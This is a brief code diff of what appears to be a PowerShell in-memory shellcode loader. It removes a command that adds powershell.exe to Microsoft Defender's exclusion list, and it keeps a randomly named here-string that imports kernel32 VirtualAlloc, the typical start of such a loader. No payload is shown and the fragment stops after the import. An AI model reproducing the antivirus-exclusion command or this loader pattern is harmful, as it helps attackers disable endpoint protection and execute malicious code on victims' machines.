@@ -1,5 +1,3 @@
-Add-MpPreference -ExclusionProcess powershell.exe
-
 $qAVGBKkQ = @"
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
